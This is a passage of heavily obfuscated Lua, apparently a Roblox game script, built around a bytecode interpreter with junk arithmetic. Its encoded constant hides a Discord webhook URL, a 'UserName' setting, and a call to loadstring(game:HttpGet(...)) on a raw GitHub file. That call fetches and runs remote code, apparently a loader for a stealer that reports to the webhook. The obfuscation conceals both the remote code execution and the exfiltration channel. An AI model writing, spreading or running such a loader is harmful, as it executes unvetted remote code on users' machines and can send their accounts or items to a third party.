																																						v270[v272[2]] = v272[992 - (656 + 333)];
																																					else
																																						local v368 = 0;
																																						local v369;
																																						local v370;
																																						while true do
																																							if (0 == v368) then
																																								v369 = 0;
																																								v370 = nil;
																																								v368 = 1;
																																							end
																																							if (v368 == 1) then
																																								while true do
																																									if (0 == v369) then
																																										v370 = v272[3 - 1];
																																										do
																																											return v21(v270, v370, v232);
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v273 > (27 + 1)) then
																																					v270[v272[1480 - (71 + 1407)]] = v270[v272[1147 - (631 + 513)]];
																																				else
																																					v270[v272[(2 + 1) - 1]] = v84[v272[1 + (9 - 7)]];
																																				end
																																				v231 = v231 + 1;
																																				break;
																																			end
																																			if (v279 == 0) then
																																				local v293 = 0;
																																				while true do
																																					if (v293 == 1) then
																																						v279 = 1;
																																						break;
																																					end
																																					if (v293 == 0) then
																																						v272 = v264[v231];
																																						v273 = v272[1];
																																						v293 = 1;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															break;
																														end
																														if (v263 == 0) then
																															v264 = v145;
																															v265 = v146;
																															v266 = v147;
																															v267 = v55;
																															v263 = 1;
																														end
																														if (v263 == 1) then
																															v268 = {};
																															v269 = {};
																															v270 = {};
																															for v280 = 0 + 0, v234 do
																																if (v280 >= v266) then
																																	v268[v280 - v266] = v233[v280 + (1961 - (48 + 1912))];
																																else
																																	v270[v280] = v233[v280 + (1012 - (282 + 729))];
																																end
																															end
																															v263 = 2;
																														end
																													end
																												end;
																												v246 = 1;
																											end
																										end
																									end
																									if (v230 == 0) then
																										local v247 = 0;
																										while true do
																											if (v247 == 0) then
																												v231 = 1673 - (1660 + 12);
																												v232 = -(1394 - (422 + 66 + 905));
																												v247 = 1;
																											end
																											if (1 == v247) then
																												v230 = 1;
																												break;
																											end
																										end
																									end
																									if (v230 == 3) then
																										_G['A'], _G['B'] = v55(v19(v235));
																										if not _G['A'][1] then
																											local v254 = 0;
																											local v255;
																											local v256;
																											while true do
																												if (v254 == 0) then
																													v255 = 0;
																													v256 = nil;
																													v254 = 1;
																												end
																												if (v254 == 1) then
																													while true do
																														if (0 == v255) then
																															v256 = v83[15 - 11][v231] or "?";
																															error(v7("\34\203\250\20\1\220\168\24\3\218\231\15\81\201\252\93\42", "\113\168\136\125") .. v256 .. v7("\225\111", "\188\85\208\226\30\59") .. _G['A'][6 - 4]);
																															break;
																														end
																													end
																													break;
																												end
																											end
																										else
																											return v21(_G['A'], 1 + 1, _G['B']);
																										end
																										break;
																									end
																									if (v230 == 1) then
																										local v248 = 0;
																										while true do
																											if (v248 == 1) then
																												v230 = 2;
																												break;
																											end
																											if (v248 == 0) then
																												v233 = {...};
																												v234 = v20("#", ...) - (422 - (331 + 90));
																												v248 = 1;
																											end
																										end
																									end
																								end
																								break;
																							end
																						end
																					end;
																				end
																			end
																		end
																		if (v144 == 0) then
																			local v198 = 0;
																			while true do
																				if (v198 == 1) then
																					v144 = 1;
																					break;
																				end
																				if (v198 == 0) then
																					v145 = v83[749 - (294 + 323 + 131)];
																					v146 = v83[(337 - (271 + 57)) - 7];
																					v198 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v143 == 1) then
															v146 = nil;
															v147 = nil;
															v143 = 2;
														end
													end
												end;
												return v57(v56(), {}, v35)(...);
											end
										end
									end
									v59 = 3;
								end
								if (v59 == 3) then
									if (2 == v45) then
										local v64 = 0;
										while true do
											if (v64 == 1) then
												v50 = function(v96, v97, v98, v99, v100, v101, v102, v103, v104, v105)
													local v148 = 0;
													local v149;
													local v150;
													local v151;
													while true do
														if (v148 == 0) then
															v149 = 0;
															v150 = nil;
															v148 = 1;
														end
														if (v148 == 1) then
															v151 = nil;
															while true do
																local v186 = 0;
																while true do
																	if (v186 == 0) then
																		if (v149 == 1) then
																			return (v151 * (221 + 35)) + v150;
																		end
																		if (v149 == 0) then
																			local v199 = 0;
																			while true do
																				if (v199 == 0) then
																					v150, v151 = v9(v34, v46, v46 + 2 + (884 - (146 + 738)));
																					v46 = v46 + 1 + 1;
																					v199 = 1;
																				end
																				if (v199 == 1) then
																					v149 = 3 - 2;
																					break;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v45 = 3;
												break;
											end
											if (v64 == 0) then
												v49 = function(v106, v107, v108, v109, v110, v111)
													local v152 = 0;
													local v153;
													local v154;
													while true do
														if (v152 == 0) then
															v153 = 0;
															v154 = nil;
															v152 = 1;
														end
														if (v152 == 1) then
															while true do
																local v187 = 0;
																while true do
																	if (v187 == 0) then
																		if (v153 == 1) then
																			return v154;
																		end
																		if (v153 == 0) then
																			local v200 = 0;
																			while true do
																				if (v200 == 1) then
																					v153 = 1;
																					break;
																				end
																				if (v200 == 0) then
																					v154 = v9(v34, v46, v46);
																					v46 = v46 + 1 + 0 + 0 + 0 + 0;
																					v200 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v50 = nil;
												v64 = 1;
											end
										end
									end
									if (4 == v45) then
										local v65 = 0;
										while true do
											if (v65 == 0) then
												v52 = function(v112, v113, v114, v115, v116, v117)
													local v155 = 0;
													local v156;
													local v157;
													local v158;
													local v159;
													local v160;
													local v161;
													local v162;
													while true do
														if (v155 == 0) then
															v156 = 0;
															v157 = nil;
															v155 = 1;
														end
														if (v155 == 1) then
															v158 = nil;
															v159 = nil;
															v155 = 2;
														end
														if (v155 == 2) then
															v160 = nil;
															v161 = nil;
															v155 = 3;
														end
														if (v155 == 3) then
															v162 = nil;
															while true do
																local v188 = 0;
																while true do
																	if (1 == v188) then
																		if (v156 == 3) then
																			local v201 = 0;
																			while true do
																				if (v201 == 0) then
																					if (v161 == ((1536 - ((1302 - (448 + 769)) + 1451)) + ((8 + 1673) - (671 + (1081 - (64 + 7)))))) then
																						if (v160 == (742 - ((152 - 119) + 538 + 171))) then
																							return v162 * 0;
																						else
																							local v241 = 0;
																							local v242;
																							while true do
																								if (v241 == 0) then
																									v242 = 0;
																									while true do
																										if (v242 == 0) then
																											v161 = (4 + (0 - 0)) - (7 - (2 + 2));
																											v159 = 0 + 0 + (0 - 0);
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																					elseif (v161 == (4880 - (3688 - (638 + 217)))) then
																						return ((v160 == (549 - (23 + 213 + (1986 - (1447 + 226))))) and (v162 * ((((2292 - (953 + 170)) - ((1197 - (246 + 568)) + 785)) + (283 - (44 + 239))) / (0 - 0)))) or (v162 * NaN);
																					end
																					return v16(v162, v161 - 1023) * (v159 + (v160 / (((1171 - (855 + (653 - 341))) - ((3384 - 2108) - ((790 - (270 + 243)) + 997))) ^ ((1636 - (149 + 378)) - ((2009 - 1459) + 507)))));
																				end
																			end
																		end
																		if (v156 == (4 - 3)) then
																			local v202 = 0;
																			while true do
																				if (v202 == 1) then
																					v156 = 2 - 0;
																					break;
																				end
																				if (v202 == 0) then
																					v159 = 4 - (1017 - (890 + 124));
																					v160 = (v48(v158, 1 + 0, 20) * ((2 - 0) ^ (1133 - ((1331 - (873 + 424)) + 1067)))) + v157;
																					v202 = 1;
																				end
																			end
																		end
																		break;
																	end
																	if (v188 == 0) then
																		if (v156 == 0) then
																			local v203 = 0;
																			while true do
																				if (1 == v203) then
																					v156 = 407 - (223 + 183);
																					break;
																				end
																				if (v203 == 0) then
																					v157 = v51();
																					v158 = v51();
																					v203 = 1;
																				end
																			end
																		end
																		if (v156 == 2) then
																			local v204 = 0;
																			while true do
																				if (v204 == 1) then
																					v156 = 1061 - (433 + 625);
																					break;
																				end
																				if (v204 == 0) then
																					v161 = v48(v158, (640 - (544 + 4 + 19)) - (46 + 6), ((3 + 9) - 7) + 26);
																					v162 = ((v48(v158, (2 - 1) + 31) == (1570 - (1153 + 416))) and -(263 - (126 + 136))) or ((1 - (1761 - (300 + 1461))) + 0);
																					v204 = 1;
																				end
																			end
																		end
																		v188 = 1;
																	end
																end
															end
															break;
														end
													end
												end;
												v53 = nil;
												v65 = 1;
											end
											if (v65 == 1) then
												v53 = function(v118, v119, v120, v121, v122, v123, v124, v125)
													local v163 = 0;
													local v164;
													local v165;
													local v166;
													while true do
														if (v163 == 0) then
															v164 = 0 + 0;
															v165 = nil;
															v163 = 1;
														end
														if (v163 == 1) then
															v166 = nil;
															while true do
																local v189 = 0;
																while true do
																	if (v189 == 1) then
																		if (v164 == (1682 - (1406 + 275))) then
																			local v205 = 0;
																			while true do
																				if (v205 == 1) then
																					v164 = 2;
																					break;
																				end
																				if (v205 == 0) then
																					v165 = v11(v34, v46, (v46 + v118) - (1186 - (766 + 419)));
																					v46 = v46 + v118;
																					v205 = 1;
																				end
																			end
																		end
																		if (v164 == 3) then
																			return v14(v166);
																		end
																		break;
																	end
																	if (v189 == 0) then
																		if (v164 == 0) then
																			local v206 = 0;
																			while true do
																				if (v206 == 0) then
																					v165 = nil;
																					if not v118 then
																						local v239 = 0;
																						local v240;
																						while true do
																							if (v239 == 0) then
																								v240 = 0;
																								while true do
																									if (v240 == 0) then
																										v118 = v51();
																										if (v118 == 0) then
																											return "";
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v206 = 1;
																				end
																				if (v206 == 1) then
																					v164 = 1;
																					break;
																				end
																			end
																		end
																		if (v164 == (1 + 1)) then
																			local v207 = 0;
																			while true do
																				if (v207 == 0) then
																					v166 = {};
																					for v236 = 1, #v165 do
																						v166[v236] = v10(v9(v11(v165, v236, v236)));
																					end
																					v207 = 1;
																				end
																				if (v207 == 1) then
																					v164 = 5 - 2;
																					break;
																				end
																			end
																		end
																		v189 = 1;
																	end
																end
															end
															break;
														end
													end
												end;
												v45 = 5;
												break;
											end
										end
									end
									break;
								end
								if (1 == v59) then
									if (3 == v45) then
										local v66 = 0;
										while true do
											if (1 == v66) then
												v52 = nil;
												v45 = 4;
												break;
											end
											if (v66 == 0) then
												v51 = nil;
												v51 = function(v126, v127, v128, v129, v130, v131, v132, v133, v134)
													local v167 = 0;
													local v168;
													local v169;
													local v170;
													local v171;
													local v172;
													while true do
														if (v167 == 1) then
															v170 = nil;
															v171 = nil;
															v167 = 2;
														end
														if (0 == v167) then
															v168 = 0;
															v169 = nil;
															v167 = 1;
														end
														if (v167 == 2) then
															v172 = nil;
															while true do
																local v190 = 0;
																while true do
																	if (v190 == 0) then
																		if (v168 == 0) then
																			local v208 = 0;
																			while true do
																				if (v208 == 1) then
																					v168 = 1908 - (713 + 1194);
																					break;
																				end
																				if (0 == v208) then
																					v169, v170, v171, v172 = v9(v34, v46, v46 + 1 + 1 + 0 + 1 + 0 + 0);
																					v46 = v46 + ((694 + 1171) - ((890 - ((483 - 343) + (2349 - (1590 + 112)))) + 980 + 778));
																					v208 = 1;
																				end
																			end
																		end
																		if (1 == v168) then
																			return (v172 * (5974036 + 10803180)) + (v171 * (176684 - (163513 - 52365))) + (v170 * ((767 + 24) - (53 + 482))) + v169;
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v66 = 1;
											end
										end
									end
									if (v45 == 5) then
										local v67 = 0;
										while true do
											if (0 == v67) then
												v54 = v51;
												v55 = nil;
												v67 = 1;
											end
											if (v67 == 1) then
												v55 = function(...)
													return {...}, v20("#", ...);
												end;
												v45 = 6;
												break;
											end
										end
									end
									v59 = 2;
								end
							end
						end
						break;
					end
					if (v44 == 2) then
						v53 = nil;
						v54 = nil;
						v55 = nil;
						v56 = nil;
						v44 = 3;
					end
					if (v44 == 0) then
						v45 = 0;
						v46 = nil;
						v47 = nil;
						v48 = nil;
						v44 = 1;
					end
				end
			end;
			v23("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D6503073O00B91715CD315C1603073O00D0737E9258317703073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383139363435363431302O3831363537362F7178764936597278584B774A336B5F4B30615A54716E4470667538627A732D594A7944326F6A5A486D4D345F5A4E383179596E51544A376674654975767565713835784E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C756100263O00120D3O00013O0020115O000200120D000100013O00201100010001000300120D000200013O00201100020002000400120D000300053O00060B0003000A000100010004023O000A000100120D000300063O00201100040003000700120D000500083O00201100050005000900120D000600083O00201100060006000A00061900073O000100062O001D3O00064O001D8O001D3O00044O001D3O00014O001D3O00024O001D3O00054O001D000800073O00121B0009000C3O00121B000A000D4O00180008000A00020012140008000B3O00121B0008000F3O0012140008000E3O00120D000800103O00120D000900113O00200F00090009001200121B000B00134O0016000C00014O000E0009000C4O001200083O00022O00070008000100012O000C3O00013O00013O00023O00026O00F03F026O00704002284O001300025O00121B000300014O000500045O00121B000500013O002O040003002300012O001C00076O001D000800024O001C000900014O001C000A00024O001C000B00034O001C000C00044O001D000D6O001D000E00063O002003000F000600012O000E000C000F4O0012000B3O00022O001C000C00034O001C000D00044O001D000E00013O002009000F000600012O0005001000014O0010000F000F0010001017000F0001000F0020090010000600012O0005001100014O00100010001000110010170010000100100020030010001000012O000E000D00104O0008000C6O0012000A3O000200202O000A000A00022O00010009000A4O000600073O00010004150003000500012O001C000300054O001D000400024O000A000300044O001A00036O000C3O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00263O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O00103O00103O00113O00113O00113O00113O00113O00113O00113O00113O00113O00", v17(), ...);
			break;
		end
		if (v24 == 1) then
			v4 = v3.bxor;
			v5 = table.concat;
			v6 = table.insert;
			v7 = nil;
			v24 = 2;
		end
		if (5 == v24) then
			v19 = _G[v7("\71\246\20\186\113", "\55\149\117\214\29\218")];
			v20 = _G[v7("\254\167\81\160\21\107", "\141\194\61\197\118\31\112\221")];
			v21 = _G[v7("\193\125\77\226\209\247", "\180\19\61\131\178\156\165")] or _G[v7("\95\233\170\177\78", "\43\136\200\221")][v7("\70\193\11\88\162\118", "\51\175\123\57\193\29")];
			v22 = _G[v7("\250\182\113\174\125\236\188\109", "\142\217\31\219\16")];
			v24 = 6;
		end
		if (v24 == 0) then
			v0 = string.char;
			v1 = string.byte;
			v2 = string.sub;
			v3 = bit32 or bit;
			v24 = 1;
		end
		if (3 == v24) then
			v11 = _G[v7("\73\224\188\116\93\113", "\58\148\206\29\51\22\220")][v7("\154\4\235", "\233\113\137\185\26")];
			v12 = _G[v7("\175\21\163\123\169\141", "\220\97\209\18\199\234")][v7("\54\171\68\245", "\81\216\49\151\184")];
			v13 = _G[v7("\192\184\20\4\221\171", "\179\204\102\109")][v7("\40\200\254", "\90\173\142\110\123\55\217")];
			v14 = _G[v7("\221\52\21\224\92", "\169\85\119\140\57")][v7("\20\21\195\234\171\73", "\119\122\173\137\202\61\17")];
			v24 = 4;
		end
	end
end
